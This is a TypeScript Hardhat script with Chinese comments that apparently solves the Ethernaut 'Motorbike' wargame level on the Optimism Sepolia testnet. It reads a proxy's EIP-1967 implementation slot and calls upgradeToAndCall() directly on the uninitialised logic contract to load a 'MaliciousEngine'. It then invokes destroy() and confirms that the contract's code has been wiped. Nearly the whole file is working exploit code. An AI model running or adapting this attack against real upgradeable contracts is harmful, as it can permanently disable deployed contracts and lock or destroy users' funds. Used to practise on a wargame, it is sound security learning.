import { network } from "hardhat";
import { getAddress, encodeFunctionData } from "viem";

// 簡單的延遲函數
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// 合約地址
const CONTRACT_ADDRESS = "0x34D6eF31626fc904d4aE134C79F36aF3693d5473";
const ENGINE_ADDRESS = "0xade0bdEcA29eA8Ae377ea5052390c37A2e979DD0";
const MALICIOUS_ENGINE_ADDRESS = "0x4A5CC5A8D8dFDB13947fb460300c02E31396E265";

// EIP-1967 implementation slot
const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

async function main() {
  console.log("連接到 OptimismSepolia 網路...");
  console.log("Motorbike 合約地址:", CONTRACT_ADDRESS);

  // 使用 Hardhat 的 network.connect() 連接網路
  const { viem } = await network.connect({
    network: "optimismSepolia",
    chainType: "op",
  });

  const publicClient = await viem.getPublicClient();
  const [walletClient] = await viem.getWalletClients();

  console.log("帳戶地址:", walletClient.account.address);
  console.log("\n正在讀取 IMPLEMENTATION_SLOT 的值...");

  // 讀取 implementation slot 的值
  const storageValue = await publicClient.getStorageAt({
    address: CONTRACT_ADDRESS as `0x${string}`,
    slot: IMPLEMENTATION_SLOT as `0x${string}`,
  });

  console.log("Storage slot 原始值:", storageValue);

  // 將 bytes32 轉換為 address (取最後 20 bytes，即 40 個 hex 字符)
  if (storageValue) {
    // 移除 '0x' 前綴，取最後 40 個字符（20 bytes = 40 hex chars），然後加上 '0x'
    const addressHex = storageValue.slice(-40);
    const implementationAddress = `0x${addressHex}`;

    console.log("實現地址 (Implementation Address):", implementationAddress);
    console.log("實現地址 (已格式化):", getAddress(implementationAddress));
  } else {
    console.log("無法讀取 storage slot 的值");
  }

  // 直接呼叫 initialize()

  // 部屬 MaliciousEngine
  // 地址 0x2A2873F572EE7e708B4FF350241B63ba7dc15B2F

  // 直接呼叫邏輯合約的 upgradeToAndCall() 函數, 升級實現地址為 MaliciousEngine, 並呼叫 destroy()
  console.log("\n正在準備升級合約並呼叫 destroy()...");

  // 1. 編碼 destroy() 函數調用作為 data 參數
  const destroyData = encodeFunctionData({
    abi: [
      {
        name: "destroy",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [],
        outputs: [],
      },
    ],
    functionName: "destroy",
  });

  console.log("destroy() 編碼數據:", destroyData);

  // 2. 編碼 upgradeToAndCall(address newImplementation, bytes memory data) 函數調用
  const upgradeToAndCallData = encodeFunctionData({
    abi: [
      {
        name: "upgradeToAndCall",
        type: "function",
        stateMutability: "payable",
        inputs: [
          {
            name: "newImplementation",
            type: "address",
          },
          {
            name: "data",
            type: "bytes",
          },
        ],
        outputs: [],
      },
    ],
    functionName: "upgradeToAndCall",
    args: [MALICIOUS_ENGINE_ADDRESS as `0x${string}`, destroyData],
  });

  console.log("upgradeToAndCall() 編碼數據:", upgradeToAndCallData);
  console.log("目標合約地址:", ENGINE_ADDRESS);
  console.log("將直接呼叫邏輯合約 (ENGINE_ADDRESS) 的 upgradeToAndCall()");

  // 3. 直接呼叫邏輯合約 (ENGINE_ADDRESS) 的 upgradeToAndCall()
  console.log("\n發送交易...");
  const hash = await walletClient.sendTransaction({
    to: ENGINE_ADDRESS as `0x${string}`,
    data: upgradeToAndCallData,
  });

  console.log("交易哈希:", hash);
  console.log("等待交易確認...");

  // 等待交易確認
  const receipt = await publicClient.waitForTransactionReceipt({ hash });
  console.log("交易已確認！");
  console.log("交易狀態:", receipt.status);
  console.log("Gas 使用量:", receipt.gasUsed.toString());
  // 在交易確認後，檢查合約的 code
  console.log("\n檢查合約是否被破壞...");
  const code = await publicClient.getBytecode({
    address: ENGINE_ADDRESS as `0x${string}`,
  });

  if (!code || code === "0x") {
    console.log("✅ 成功！邏輯合約已被破壞（code 為空）");
  } else {
    console.log("❌ 合約仍然存在（code 不為空）");
    console.log("Code 長度:", code.length);
  }


}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

